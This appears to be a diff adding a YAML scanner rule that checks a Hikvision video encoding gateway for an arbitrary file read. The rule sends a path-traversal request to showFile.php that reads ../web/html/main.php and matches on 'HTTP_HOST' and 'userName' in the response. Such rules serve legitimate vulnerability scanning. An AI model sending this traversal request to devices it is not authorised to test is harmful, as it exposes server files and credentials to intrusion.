@@ -1,0 +1,13 @@
+name: HIKVISION-视频编码网关-showfile-文件读取
+description: >
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /serverLog/showFile.php?fileName=../web/html/main.php
+    expression:
+      status: 200
+      body_all:
+        - "HTTP_HOST"
+        - "userName" 
